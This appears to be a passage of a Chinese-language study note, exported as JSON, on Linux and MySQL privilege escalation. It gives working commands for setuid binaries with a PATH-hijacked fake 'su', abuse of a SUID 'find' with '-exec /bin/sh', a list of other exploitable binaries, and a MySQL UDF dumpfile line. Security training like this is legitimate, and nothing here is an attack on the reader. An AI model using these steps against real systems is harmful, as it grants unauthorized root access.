var(--b3-font-color9);\"}"}]},{"Type":"NodeBlockquoteMarker","Data":"\u003e"}]},{"ID":"20241029195408-t9f8wes","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029195408-t9f8wes"}},{"ID":"20241029195409-2yavcz4","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029195409-2yavcz4","updated":"20241029195415"},"Children":[{"Type":"NodeText","Data":"自定义文件进行提权"}]},{"ID":"20241029195423-m69x7wr","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029195423-m69x7wr","updated":"20241029200245"},"Children":[{"Type":"NodeText","Data":"1.编写.c文件，内容为root权限，在/tmp路径下，切换到普通用户，实现第三方免密用指定账号登录"}]},{"ID":"20241029195418-55mpua5","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029195418-55mpua5","updated":"20241029195421"},"Children":[{"Type":"NodeText","Data":"demo.c"}]},{"ID":"20241029102139-8j0yfyg","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029102139-8j0yfyg","updated":"20241029200325"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"vi demo.c\n#include\u003cunistd.h\u003e\nvoid main(){\nsetuid(0);\nsetgid(0);\nsystem(\"su - gua\");\n}\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102137-bav60xk","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029102137-bav60xk","updated":"20241029200153"},"Children":[{"Type":"NodeText","Data":"2.编译文件，得到二进制文件demo"}]},{"ID":"20241029200143-eijzqrx","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200143-eijzqrx","updated":"20241029200143"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"gcc demo.c -o demo\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102634-9pieyyj","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029102634-9pieyyj","updated":"20241029200219"},"Children":[{"Type":"NodeText","Data":"3.给demo文件添加s权限"}]},{"ID":"20241029200219-xa2wlc0","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200219-xa2wlc0","updated":"20241029200229"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"chmod u+s demo\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102658-0h6klw6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029102658-0h6klw6","updated":"20241029200354"},"Children":[{"Type":"NodeText","Data":"4.伪装su文件。因为demo.c中有“su-gua”这个系统命令，要让这个su命令执行的不是系统自带的su脚本"}]},{"ID":"20241029200355-mrakxeb","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200355-mrakxeb","updated":"20241029200428"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"echo \"/bin/bash\" \u003esu\ncat su\nchmod 777 su\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029101943-hnws8wf","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029101943-hnws8wf","updated":"20241029200509"},"Children":[{"Type":"NodeText","Data":"5.添加环境变量，让系统执行/tmp下的su文件："}]},{"ID":"20241029102011-yw39sqs","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029102011-yw39sqs","updated":"20241029200532"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"export $PATH=/tmp:$﻿PATH\necho $PATH                //验证环境路径\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029200540-fc5qfwy","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029200540-fc5qfwy","updated":"20241029200602"},"Children":[{"Type":"NodeText","Data":"测试，在普通用户下运行demo程序，成功切换到root用户，提权成功"}]},{"ID":"20241029200603-yn8rzlg","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200603-yn8rzlg","updated":"20241029200619"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"cd /tmp\n./demo\nid\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029102947-h9fkpw6","Type":"NodeHeading","HeadingLevel":5,"Properties":{"fold":"1","heading-fold":"1","id":"20241029102947-h9fkpw6","updated":"20241029102957"},"Children":[{"Type":"NodeText","Data":"find_Suid提权"}]},{"ID":"20241029103130-ro57fbs","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029103130-ro57fbs","updated":"20241029200641"},"Children":[{"Type":"NodeText","Data":"部署环境"}]},{"ID":"20241029200715-u19e5qp","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029200715-u19e5qp","updated":"20241029200733"},"Children":[{"Type":"NodeText","Data":"1.找到find的脚本路径位置，并对其添加s权限"}]},{"ID":"20241029103041-3nstqae","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029103041-3nstqae","updated":"20241029200712"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"which find 查找\nchmod u+s  /usr/bin/find\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029103110-pyrmqa6","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103110-pyrmqa6","updated":"20241029200918"},"Children":[{"Type":"NodeText","Data":"2.测试：切换普通用户，并执行find语句。执行 whoami 的结果为root,说明find的s权限，让恶意用户越权成功"}]},{"ID":"20241029200754-g4w3g1k","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200754-g4w3g1k","updated":"20241029200858"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"cd /tmp\n\nfind dcro-ubuntu -exec \"whoami\"\n\nfind dcro-ubuntu -exec \"/bin/sh\"  临时交互平台，用的root用户权限，/bin/bash不行\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029103144-1qlq4lj","Type":"NodeHeading","HeadingLevel":6,"Properties":{"fold":"1","heading-fold":"1","id":"20241029103144-1qlq4lj","updated":"20241029200935"},"Children":[{"Type":"NodeText","Data":"其他suid提权"}]},{"ID":"20241029200936-q69iplp","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"fold":"1","heading-fold":"1","id":"20241029200936-q69iplp","updated":"20241029201019"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"bash less/more/man python/perl/ruby/lua awk tcpdump 等\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029103602-gcimjba","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103602-gcimjba"}},{"ID":"20241029103610-ydo774t","Type":"NodeParagraph","Properties":{"fold":"1","heading-fold":"1","id":"20241029103610-ydo774t"}},{"ID":"20241029103610-zs1zfjz","Type":"NodeHeading","HeadingLevel":4,"Properties":{"id":"20241029103610-zs1zfjz","updated":"20241029103619"},"Children":[{"Type":"NodeText","Data":"Mysql UDF提权"}]},{"ID":"20241029103649-ijbpa6a","Type":"NodeCodeBlock","IsFencedCodeBlock":true,"Properties":{"id":"20241029103649-ijbpa6a","updated":"20241029103650"},"Children":[{"Type":"NodeCodeBlockFenceOpenMarker","Data":"```"},{"Type":"NodeCodeBlockFenceInfoMarker","CodeBlockInfo":"YmFzaA=="},{"Type":"NodeCodeBlockCode","Data":"select unhex('udf十六进制內容’) into dumpfile '/usr/lib64/mysql/plugin/ichunqiu.so'\n"},{"Type":"NodeCodeBlockFenceCloseMarker","Data":"```"}]},{"ID":"20241029103655-wkvtvsh","Type":"NodeParagraph","Properties":{"id":"20241029103655-wkvtvsh","updated":"20241029103704"},"Children":[{"Type":"NodeText","Data":"dll头部"}]},{"ID":"20241029103711-fe5bnwk","Type":"NodeParagraph","Properties":{"id":"20241029103711-fe5bnwk","updated":"20241029103711"},"Children":[{"Type":"NodeText","Data":"​"},{"Type":"NodeImage","Data":"span","Children":[{"Type":"NodeBang"},{"Type":"NodeOpenBracket"},{"Type":"NodeLinkText","Data":"image"},{"Type":"NodeCloseBracket"},{"Type":"NodeOpenParen"},{"Type":"NodeLinkDest","Data":"assets/image-20241029103711-uuohtip.png"},{"Type":"NodeCloseParen"}]},{"Type":"NodeText","Data":"​"}]},{"ID":"20241029103713-5pwdytv","Type":"NodeParagraph","Properties":{"id":"20241029103713-5pwdytv"}}]}